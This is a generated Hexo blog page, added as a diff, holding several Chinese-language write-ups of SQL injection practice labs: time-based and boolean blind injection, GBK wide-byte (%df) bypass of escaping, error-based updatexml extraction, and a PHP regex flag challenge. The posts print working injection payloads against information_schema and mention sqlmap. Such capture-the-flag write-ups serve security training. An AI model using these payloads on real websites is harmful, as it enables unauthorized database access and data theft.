@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-延时注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/延时注入/" class="article-date">
+  <time datetime="2019-10-20T13:44:05.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/延时注入/">延时注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="先说一下几个可能需要用到的函数：-length-函数-返回字符串的长度-substr-截取字符串-ascii-返回字符的ascii码-sleep-将程序挂起一段时间n为n秒-if-exp1-expr2-expr3-判断语句-如果第一个语句正确就执行第二个语句如果错误就执行第三个语句-打开靶场，输入参数看页面回显："><a href="#先说一下几个可能需要用到的函数：-length-函数-返回字符串的长度-substr-截取字符串-ascii-返回字符的ascii码-sleep-将程序挂起一段时间n为n秒-if-exp1-expr2-expr3-判断语句-如果第一个语句正确就执行第二个语句如果错误就执行第三个语句-打开靶场，输入参数看页面回显：" class="headerlink" title="先说一下几个可能需要用到的函数： # length()函数 返回字符串的长度 substr()截取字符串 ascii()返回字符的ascii码 sleep()将程序挂起一段时间n为n秒 if(exp1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句如果错误就执行第三个语句 打开靶场，输入参数看页面回显："></a>先说一下几个可能需要用到的函数： # length()函数 返回字符串的长度 substr()截取字符串 ascii()返回字符的ascii码 sleep()将程序挂起一段时间n为n秒 if(exp1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句如果错误就执行第三个语句 打开靶场，输入参数看页面回显：</h1><p><img src="/upload/md/e9ad73396963e9430554d0a641af9d34_12362.png" alt> 闭合单引号并且注释掉后面的语句 <img src="/upload/md/f86ac68a5545d5e2aa70bef60b293882_21526.png" alt> 猜字段<br><img src="/upload/md/66840973aec423504a61c79d7a39834b_85392.png" alt> 使用database函数获取数据库名 然而并没有任何回显 盲注开始<br><img src="/upload/md/e6fb61021260b874df715d4580201689_41157.png" alt> 判断数据库名长度<br><a href="/upload/md/5922d93ef88ba9fa5d358010ac65581d_16584.png"></a> 猜解数据库名<br><img src="/upload/md/2d21f0de1e6a168fb2542cd98287ef08_69577.png" alt> 判断数据库中每个表的长度<br><img src="/upload/md/01019b1f08c18124500804d87f8247af_87336.png" alt> 猜解表名<br><img src="/upload/md/2ace5b824f42120c8a83ac67742028fb_49944.png" alt> 判断表中每个字段长度<br><img src="/upload/md/62ecdf837a14f2798ee96f6d855dd58a_90457.png" alt> 猜解字段名<br><img src="/upload/md/a6071998a9889e5d21bff105b34d7d09_27065.png" alt> 查出字段名flag，zkaq 查flag id=1’and if(ascii(substr((select zKaQ from zkaq limit 0,1),1,1))=115,0,sleep(10))–+ Rank2 感觉和Rank1没有什么不同，重复上面的操作就能做出来了 Rank3 和Rank1相似，闭合符号由’变成了” 重复rank1的操作，就能做出来了<br> <img src="/upload/md/e0d7ebcd7f6fde0b38016b69bff2b25c_75049.png" alt> 试试sqlmap工具<br><img src="/upload/md/2fed082ecdd3681192ce863851ac5c5f_16135.png" alt> 用sqlmap跑的flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/延时注入/" data-id="ck2ixd3ys0010ukv072p3e0yd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-宽字节注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/宽字节注入/" class="article-date">
+  <time datetime="2019-10-20T13:43:06.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/宽字节注入/">宽字节注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>宽字节注入主要源于程序员设置数据库编码与php编码设置为不同的两种编码，那么就可能产生宽字节注入例如：PHP编码为UTF-8而Mysql的编码设置为set  names ‘gbk’或是set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞(一个gbk编码汉字，占用2个字节，一个utf-8编码的汉字，占用3个字节）注意：set name ‘x’与以下三个语句等价： mysql-&gt;set charater_set_client=x; mysql-&gt;set charater_set_results=x; mysql-&gt;set charater_set_connection=x; 也就是说当你设置了set  names ‘x’时就同时执行了上面3条语句宽字节注入就是PHP发送请求到Mysql时使用了语句set  names ‘gbk’或是set character_set_client=gbk进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入 </p>
+<h2 id="打开靶场-在传参中加入id一条龙：-我们输入的语句被吃掉了一部分-我们发现-的编码是-5c-为了绕过magic-quotes-gpc函数，要引入宽字节注入的概念-繁体字-運-（运）-運的GBK编码是-df-5c-当后台数据库使用了GBK编码，而前端浏览器等使用了utf-8编码时，便可以在特殊符号前加一个-df，这样在数据库中-df-5c就被解析成了-運-，使得后面的语句可以被执行完成注入。-使用-df将转义斜杠吃掉-order-by-得知字段数为3-然后像平常的显错注入一般：-得出flag"><a href="#打开靶场-在传参中加入id一条龙：-我们输入的语句被吃掉了一部分-我们发现-的编码是-5c-为了绕过magic-quotes-gpc函数，要引入宽字节注入的概念-繁体字-運-（运）-運的GBK编码是-df-5c-当后台数据库使用了GBK编码，而前端浏览器等使用了utf-8编码时，便可以在特殊符号前加一个-df，这样在数据库中-df-5c就被解析成了-運-，使得后面的语句可以被执行完成注入。-使用-df将转义斜杠吃掉-order-by-得知字段数为3-然后像平常的显错注入一般：-得出flag" class="headerlink" title="打开靶场  在传参中加入id一条龙：  我们输入的语句被吃掉了一部分.我们发现\的编码是%5c 为了绕过magic_quotes_gpc函数，要引入宽字节注入的概念 繁体字 運 （运） 運的GBK编码是%df%5c 当后台数据库使用了GBK编码，而前端浏览器等使用了utf-8编码时，便可以在特殊符号前加一个%df，这样在数据库中%df%5c就被解析成了 運 ，使得后面的语句可以被执行完成注入。 使用%df将转义斜杠吃掉  order by 得知字段数为3  然后像平常的显错注入一般：   得出flag "></a>打开靶场 <img src="/upload/md/d72ade462e71a012f48c2cf619a22515_24913.png" alt> 在传参中加入id一条龙： <img src="/upload/md/17c34b0031c527fcc249704f2fd22335_16028.png" alt> 我们输入的语句被吃掉了一部分.我们发现\的编码是%5c 为了绕过magic_quotes_gpc函数，要引入宽字节注入的概念 繁体字 運 （运） 運的GBK编码是%df%5c 当后台数据库使用了GBK编码，而前端浏览器等使用了utf-8编码时，便可以在特殊符号前加一个%df，这样在数据库中%df%5c就被解析成了 運 ，使得后面的语句可以被执行完成注入。 使用%df将转义斜杠吃掉 <img src="/upload/md/b46fa546bfb5e6a5e96f6a62fb70b579_23625.png" alt> order by 得知字段数为3 <img src="/upload/md/20ea7312743bf7d915d4ec39b5e2a544_54150.png" alt> 然后像平常的显错注入一般： <img src="/upload/md/dd58234ac690a8259f043e0ec6fa1e14_22029.png" alt> <img src="/upload/md/50bd419ca3d6fae654dbf229ee79fa02_56691.png" alt> 得出flag <img src="/upload/md/3f6d00225b9dcacc497fcfb33f43f92f_24229.png" alt></h2><h2 id="第二关-本以为会是单引号变双引号，结果还是单引号，那干脆直接试试查flag：-第三关-界面顿时高大上，常规跑一套：-试着让他把-吃掉-好吧，这输入框有点东西-我们想想，这里尝试直接使用中文字符来进行注入，输入：運’-and-1-1-为什么输入一个汉字加一个单引号就能成功呢，首先表单会以utf-8编码的方式提交后，而汉字在utf-8编码里是占3个字节的，然后经过addslash-函数的处理，添加了反斜杠后，就多了一个字节，再跟汉字后面的单引号一起就是5个字节，因为这里MySQL数据库是gbk编码，所以中间就会经历utf-8-到-gbk这样一个转换过程，而汉字在gbk编码中占两个字节，因此是每两个字节进行一次编码，因此最后的单引号就逃出来了。-这里不能使用-–-，会报错。-在表单里，注释最好使用-或者-–后面加一个空格来代替加号-。-获取字段数，输入：運’order-by-2-获取当前数据库名，输入：運’-union-select-1-database-获取当前数据库下的表名，输入：-運’-union-select-1-table-name-from-information-schema-tables-where-table-schema-0x7365637572697479-limit-4-1-获取zkaq表的字段名，输入：-運’-union-select-1-column-name-from-information-schema-columns-where-table-name-0x7A6B6171-limit-1-1-获取flag，输入：運’-union-select-1-zKaQ-from-zkaq-limit-8-1"><a href="#第二关-本以为会是单引号变双引号，结果还是单引号，那干脆直接试试查flag：-第三关-界面顿时高大上，常规跑一套：-试着让他把-吃掉-好吧，这输入框有点东西-我们想想，这里尝试直接使用中文字符来进行注入，输入：運’-and-1-1-为什么输入一个汉字加一个单引号就能成功呢，首先表单会以utf-8编码的方式提交后，而汉字在utf-8编码里是占3个字节的，然后经过addslash-函数的处理，添加了反斜杠后，就多了一个字节，再跟汉字后面的单引号一起就是5个字节，因为这里MySQL数据库是gbk编码，所以中间就会经历utf-8-到-gbk这样一个转换过程，而汉字在gbk编码中占两个字节，因此是每两个字节进行一次编码，因此最后的单引号就逃出来了。-这里不能使用-–-，会报错。-在表单里，注释最好使用-或者-–后面加一个空格来代替加号-。-获取字段数，输入：運’order-by-2-获取当前数据库名，输入：運’-union-select-1-database-获取当前数据库下的表名，输入：-運’-union-select-1-table-name-from-information-schema-tables-where-table-schema-0x7365637572697479-limit-4-1-获取zkaq表的字段名，输入：-運’-union-select-1-column-name-from-information-schema-columns-where-table-name-0x7A6B6171-limit-1-1-获取flag，输入：運’-union-select-1-zKaQ-from-zkaq-limit-8-1" class="headerlink" title="第二关  本以为会是单引号变双引号，结果还是单引号，那干脆直接试试查flag：  ## 第三关  界面顿时高大上，常规跑一套：  试着让他把\吃掉  好吧，这输入框有点东西 我们想想，这里尝试直接使用中文字符来进行注入，输入：運’ and 1=1 #  为什么输入一个汉字加一个单引号就能成功呢，首先表单会以utf-8编码的方式提交后，而汉字在utf-8编码里是占3个字节的，然后经过addslash()函数的处理，添加了反斜杠后，就多了一个字节，再跟汉字后面的单引号一起就是5个字节，因为这里MySQL数据库是gbk编码，所以中间就会经历utf-8 到 gbk这样一个转换过程，而汉字在gbk编码中占两个字节，因此是每两个字节进行一次编码，因此最后的单引号就逃出来了。 这里不能使用 –+ ，会报错。 在表单里，注释最好使用 # 或者 –后面加一个空格来代替加号+ 。 获取字段数，输入：運’order by 2#;  获取当前数据库名，输入：運’ union select 1,database() # 获取当前数据库下的表名，输入： 運’ union select 1,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 4,1 # 获取zkaq表的字段名，输入： 運’ union select 1,column_name from information_schema.columns where table_name=0x7A6B6171 limit 1,1 # 获取flag，输入：運’ union select 1,zKaQ from zkaq limit 8,1 # "></a>第二关 <img src="/upload/md/7187ed61c361abd3bcb20892747eb11c_24771.png" alt> 本以为会是单引号变双引号，结果还是单引号，那干脆直接试试查flag： <img src="/upload/md/31c6a5dcedeb34b04fdae4537c571992_88570.png" alt> ## 第三关 <img src="/upload/md/d9b0d060ba24393c27b112fd650076a2_59886.png" alt> 界面顿时高大上，常规跑一套： <img src="/upload/md/2fab88b69313ca7e6457e10f332800ab_31783.png" alt> 试着让他把\吃掉 <img src="/upload/md/bd8bc5983a3d8009af6f3c02f0259394_94609.png" alt> 好吧，这输入框有点东西 我们想想，这里尝试直接使用中文字符来进行注入，输入：運’ and 1=1 # <img src="/upload/md/df2e9dfe8e954ec47ab871fc82c7873e_62033.png" alt> 为什么输入一个汉字加一个单引号就能成功呢，首先表单会以utf-8编码的方式提交后，而汉字在utf-8编码里是占3个字节的，然后经过addslash()函数的处理，添加了反斜杠后，就多了一个字节，再跟汉字后面的单引号一起就是5个字节，因为这里MySQL数据库是gbk编码，所以中间就会经历utf-8 到 gbk这样一个转换过程，而汉字在gbk编码中占两个字节，因此是每两个字节进行一次编码，因此最后的单引号就逃出来了。 这里不能使用 –+ ，会报错。 在表单里，注释最好使用 # 或者 –后面加一个空格来代替加号+ 。 获取字段数，输入：運’order by 2#; <img src="/upload/md/3b283fca5ed8021f9ab5df3931289081_35452.png" alt> 获取当前数据库名，输入：運’ union select 1,database() # 获取当前数据库下的表名，输入： 運’ union select 1,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 4,1 # 获取zkaq表的字段名，输入： 運’ union select 1,column_name from information_schema.columns where table_name=0x7A6B6171 limit 1,1 # 获取flag，输入：運’ union select 1,zKaQ from zkaq limit 8,1 # <img src="/upload/md/a96477bb09bc51c27d7bfa82dfe7c300_75811.png" alt></h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/宽字节注入/" data-id="ck2ixd3yp000wukv0933rgqqz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/盲注/" class="article-date">
+  <time datetime="2019-10-20T13:41:52.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/盲注/">盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>先提几个函数： length() 返回字符串函数 substr()截取字符串 ascii() 返回字符的ascii码 sleep()将程序挂起一段时间 iarf(expr1,expr2,expr3)判断语句 </p>
+<h1 id="打开第一关的靶场：打开第一关的靶场：-根据提示-1-先加引号，-发现有爆出sql语句，仿照报错注入进行操作，先进行-order-by-确定字段数量。-2、找回显点。-3-发现没有任何的回显，此时运用盲注，进行对表结构。-4-猜解数据库的名称：-判断数据长度-id-1-27-20and-20if-LENGTH-select-20database-number-1-0-23-当number-8时，有正确的回显，所以数据库的长度为8-2-gt-判断数据库名称：id-1-27-20and-20if-ascii-SUBSTR-select-20database-payload-a-1-payload-b-1-0-23-数据库名称为：security-5-猜解表名（其实可以完全不用猜解库名名）：-1-gt-猜解表的长度id-1-27-20and-20if-LENGTH-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-6-1-0-23-当长度为6时没有报错，说明第一个表的长度为6-接下来就是猜表名了：id-1-27-20and-20if-ascii-SUBSTR-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-1-1-101-1-0-23-当ascii值为101的时候没有报错，说明此表的第一个字符为e。-最终得出表名-emails-referers-uagents-users-zkaq-四：猜字段：and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’zkaq’-limit-0-1-1-1-x-–-得到列名：flag，zKaQ-猜内容：and-ascii-substr-select-zKaQ-from-zkaq-limit-4-1-1-1-x–-id-1’-or-updatexml-1-concat-0x7e-select-zKaQ-from-zkaq-where-flag-6-0x7e-1-23-得到flag"><a href="#打开第一关的靶场：打开第一关的靶场：-根据提示-1-先加引号，-发现有爆出sql语句，仿照报错注入进行操作，先进行-order-by-确定字段数量。-2、找回显点。-3-发现没有任何的回显，此时运用盲注，进行对表结构。-4-猜解数据库的名称：-判断数据长度-id-1-27-20and-20if-LENGTH-select-20database-number-1-0-23-当number-8时，有正确的回显，所以数据库的长度为8-2-gt-判断数据库名称：id-1-27-20and-20if-ascii-SUBSTR-select-20database-payload-a-1-payload-b-1-0-23-数据库名称为：security-5-猜解表名（其实可以完全不用猜解库名名）：-1-gt-猜解表的长度id-1-27-20and-20if-LENGTH-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-6-1-0-23-当长度为6时没有报错，说明第一个表的长度为6-接下来就是猜表名了：id-1-27-20and-20if-ascii-SUBSTR-select-20information-schema-TABLES-TABLE-NAME-20FROM-20information-schema-TABLES-20where-20information-schema-TABLES-TABLE-SCHEMA-select-20database-20limit-200-1-1-1-101-1-0-23-当ascii值为101的时候没有报错，说明此表的第一个字符为e。-最终得出表名-emails-referers-uagents-users-zkaq-四：猜字段：and-ascii-substr-select-column-name-from-information-schema-columns-where-table-name-’zkaq’-limit-0-1-1-1-x-–-得到列名：flag，zKaQ-猜内容：and-ascii-substr-select-zKaQ-from-zkaq-limit-4-1-1-1-x–-id-1’-or-updatexml-1-concat-0x7e-select-zKaQ-from-zkaq-where-flag-6-0x7e-1-23-得到flag" class="headerlink" title="打开第一关的靶场：打开第一关的靶场：  根据提示:  1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。  2、找回显点。  3.发现没有任何的回显，此时运用盲注，进行对表结构。 4.猜解数据库的名称： 判断数据长度: id=1%27%20and%20if(LENGTH((select%20database()))=number,1,0)%23 当number=8时，有正确的回显，所以数据库的长度为8  2.&gt;判断数据库名称：id=1%27%20and%20if(ascii(SUBSTR((select%20database()),payload_a,1))=payload_b,1,0)%23 数据库名称为：security 5.猜解表名（其实可以完全不用猜解库名名）： 1.&gt;猜解表的长度id=1%27%20and%20if(LENGTH((select%20information_schema.TABLES.TABLE_NAME%20FROM%20information_schema.TABLES%20where%20information_schema.TABLES.TABLE_SCHEMA=(select%20database())%20limit%200,1))=6,1,0)%23  当长度为6时没有报错，说明第一个表的长度为6 接下来就是猜表名了：id=1%27%20and%20if(ascii(SUBSTR((select%20information_schema.TABLES.TABLE_NAME%20FROM%20information_schema.TABLES%20where%20information_schema.TABLES.TABLE_SCHEMA=(select%20database())%20limit%200,1),1,1))=101,1,0)%23  当ascii值为101的时候没有报错，说明此表的第一个字符为e。 最终得出表名:emails,referers,uagents,users,zkaq 四：猜字段：and (ascii(substr((select column_name from information_schema.columns where table_name=’zkaq’ limit 0,1),1,1)))=x –+ 得到列名：flag，zKaQ 猜内容：and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=x–+ id=1’ or updatexml(1,concat(0x7e,(select zKaQ from zkaq where flag=6),0x7e),1)%23 得到flag "></a>打开第一关的靶场：打开第一关的靶场： <img src="/upload/md/52be0dc0a320828b3d2658d1b6f8af9a_12349.png" alt> 根据提示: <img src="/upload/md/63440796348c584ce89b921769841fb3_51912.png" alt> 1.先加引号， 发现有爆出sql语句，仿照报错注入进行操作，先进行 order by 确定字段数量。 <img src="/upload/md/401eb3d12f1e782dbd34c35cd38f741f_99610.png" alt> 2、找回显点。 <img src="/upload/md/37bcd887937403cb476e6ea2e45546f9_72083.png" alt> 3.发现没有任何的回显，此时运用盲注，进行对表结构。 4.猜解数据库的名称： 判断数据长度: id=1%27%20and%20if(LENGTH((select%20database()))=number,1,0)%23 当number=8时，有正确的回显，所以数据库的长度为8 <img src="/upload/md/ab53cef5691fc77e50538722a641e061_67763.png" alt> 2.&gt;判断数据库名称：id=1%27%20and%20if(ascii(SUBSTR((select%20database()),payload_a,1))=payload_b,1,0)%23 数据库名称为：security 5.猜解表名（其实可以完全不用猜解库名名）： 1.&gt;猜解表的长度id=1%27%20and%20if(LENGTH((select%20information_schema.<code>TABLES</code>.TABLE_NAME%20FROM%20information_schema.<code>TABLES</code>%20where%20information_schema.<code>TABLES</code>.TABLE_SCHEMA=(select%20database())%20limit%200,1))=6,1,0)%23 <img src="/upload/md/382a3f44bbf6140483d66ebdd62435bc_27360.png" alt> 当长度为6时没有报错，说明第一个表的长度为6 接下来就是猜表名了：id=1%27%20and%20if(ascii(SUBSTR((select%20information_schema.<code>TABLES</code>.TABLE_NAME%20FROM%20information_schema.<code>TABLES</code>%20where%20information_schema.<code>TABLES</code>.TABLE_SCHEMA=(select%20database())%20limit%200,1),1,1))=101,1,0)%23 <img src="/upload/md/1cb9f7cd22a8535d904fe6ac416ce77f_24383.png" alt> 当ascii值为101的时候没有报错，说明此表的第一个字符为e。 最终得出表名:emails,referers,uagents,users,zkaq 四：猜字段：and (ascii(substr((select column_name from information_schema.columns where table_name=’zkaq’ limit 0,1),1,1)))=x –+ 得到列名：flag，zKaQ 猜内容：and (ascii(substr(( select zKaQ from zkaq limit 4,1),1,1)))=x–+ id=1’ or updatexml(1,concat(0x7e,(select zKaQ from zkaq where flag=6),0x7e),1)%23 得到flag <img src="/upload/md/f156674d5b76ae12cce9f6bc6bf6393d_22639.png" alt></h1><h2 id="打开第二关的靶场"><a href="#打开第二关的靶场" class="headerlink" title="打开第二关的靶场"></a>打开第二关的靶场</h2><p><img src="/upload/md/bdef5fbd0dbe5145d154a693c3b4f140_81323.png" alt> 我们发现是用双引号闭合的，其他的做法和第一关一样， 附上flag: <img src="/upload/md/2d269e5485ec02ed22ebe8b13432f4a1_60312.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/盲注/" data-id="ck2ixd3yw0018ukv0fep7lsb9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-显错注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/显错注入/" class="article-date">
+  <time datetime="2019-10-20T13:39:59.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/显错注入/">显错注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="rank——1：-打开靶场，根据提示，在url栏中加入id-1-可知，用’可以闭合语句-测试注入点：-存在注入-猜字段：order-by-得出3个字段-查库名：-查表：-得出：-在zkaq表中查zkaq-得出了flag：zKaQ-ErR0rBaS4d"><a href="#rank——1：-打开靶场，根据提示，在url栏中加入id-1-可知，用’可以闭合语句-测试注入点：-存在注入-猜字段：order-by-得出3个字段-查库名：-查表：-得出：-在zkaq表中查zkaq-得出了flag：zKaQ-ErR0rBaS4d" class="headerlink" title="rank——1： 打开靶场，根据提示，在url栏中加入id=1 可知，用’可以闭合语句  测试注入点：   存在注入 猜字段：order by  得出3个字段 查库名：  查表：  得出：  在zkaq表中查zkaq  得出了flag：zKaQ-ErR0rBaS4d"></a>rank——1：<img src="https://www.zkaq.org/upload/md/2f1464abbc462c501dc28dee8f7356aa_83478.png" alt> 打开靶场，根据提示，在url栏中加入id=1 可知，用’可以闭合语句 <img src="https://www.zkaq.org/upload/md/cb74e288e67320ecb87048e3a0d8ff2e_82972.png" alt> 测试注入点： <img src="https://www.zkaq.org/upload/md/99b5c25fcb7fdf51ec5648ee2ff3e04e_96016.png" alt> <img src="/upload/md/d4a78664af97544a5730a0fd74948857_94786.png" alt> 存在注入 猜字段：order by <img src="https://www.zkaq.org/upload/md/d4a78664af97544a5730a0fd74948857_94786.png" alt> 得出3个字段 查库名： <img src="https://www.zkaq.org/upload/md/27d9cf13e243c9ea19a40846ccf0f4d5_35073.png" alt> 查表： <img src="https://www.zkaq.org/upload/md/d52946033b3d30edd781e75e6834bffa_24889.png" alt> 得出： <img src="https://www.zkaq.org/upload/md/0be387c9f3b4c7689bba22545a7360b1_41102.png" alt> 在zkaq表中查zkaq <img src="https://www.zkaq.org/upload/md/224afcc56c8e4a67eb829d912127c04d_55311.png" alt> 得出了flag：zKaQ-ErR0rBaS4d</h1><h1 id="rank-2：-Your-sql-statement-is-SELECT-FROM-users-WHERE-id-1-and-1-1-LIMIT-0-1-根据语句，无闭合"><a href="#rank-2：-Your-sql-statement-is-SELECT-FROM-users-WHERE-id-1-and-1-1-LIMIT-0-1-根据语句，无闭合" class="headerlink" title="rank-2：  Your sql statement is SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 根据语句，无闭合"></a>rank-2： <img src="https://www.zkaq.org/upload/md/1971fa6c9f78910b909d6edd32e3112c_33152.png" alt> Your sql statement is SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 根据语句，无闭合</h1><h1 id="rank-3：-Your-sql-statement-is-SELECT-FROM-users-WHERE-id-‘1’-LIMIT-0-1-根据语句，用’-闭合"><a href="#rank-3：-Your-sql-statement-is-SELECT-FROM-users-WHERE-id-‘1’-LIMIT-0-1-根据语句，用’-闭合" class="headerlink" title="rank-3：  Your sql statement is SELECT * FROM users WHERE id=(‘1’) LIMIT 0,1 根据语句，用’)闭合"></a>rank-3： <img src="/upload/md/a95291bb0248d4bd9b63e4fcb0a1e6fc_24262.png" alt> Your sql statement is SELECT * FROM users WHERE id=(‘1’) LIMIT 0,1 根据语句，用’)闭合</h1><h1 id="rank-4："><a href="#rank-4：" class="headerlink" title="rank-4："></a>rank-4：</h1><p> <img src="/upload/md/0fc90f000177f733935683fb10976e83_88344.png" alt> Your sql statement is SELECT * FROM users WHERE id=(“1”) LIMIT 0,1 根据语句，用”)闭合</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/显错注入/" data-id="ck2ixd3yv0016ukv0rs232js6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-正则表达式" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/14/正则表达式/" class="article-date">
+  <time datetime="2019-10-14T01:02:44.000Z" itemprop="datePublished">2019-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/14/正则表达式/">正则表达式</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&lt;?php<br>$key=’flag{*<em>}’;<br>$Regular= preg_match(“/zkaq.key.{2,9}:/./(key</em>key)/i”, trim($_GET[“id”]), $match);<br>if( $Regular ){<br>die(‘key: ‘.$key);<br>}<br>打开靶场，题目如上</p>
+<p>简单分析：</p>
+<p>trim（) 函数处理过的，以get方式传参的id值，这个id的传参经过正则匹配，结果储存到$match</p>
+<p>2.preg_match() 函数</p>
+<p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
+<p>preg_match() 函数第一次匹配成功后就会停止匹配</p>
+<p>3..根据/zkaq.key.{2,9}:/./(key*key)/i 正则表达式，我们可以就可以构造出需要匹配检索的对象trim($_GET[“id”])</p>
+<p>/ ：PHP中使用正则表达式匹配一定要加/</p>
+<p>. ：匹配任意字符</p>
+<p>：匹配前面的子表达式任意次<br>{2,9} ：最少匹配2次且最多匹配9次</p>
+<p>\ ：将下一个字符标记符、或一个向后引用、或一个八进制转义符</p>
+<p>/ ：/一般用于 正则的开始和结束,/是特殊字符 所以中途要使用/就得用\符号来转义了</p>
+<p>i ：不区分大小写<br>所以我决定构造以下id：<br>id=zkaqkey24://keykey<br>然后回车键入<br><img src="https://www.zkaq.org/upload/md/6f7dbfd6c97b90006df8093096711f9f_22869.png" alt><br>成功出现了flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/14/正则表达式/" data-id="ck2ixd3yy001aukv0uj8irru5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/14/hello-world/" class="article-date">
+  <time datetime="2019-10-13T16:06:56.602Z" itemprop="datePublished">2019-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/14/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
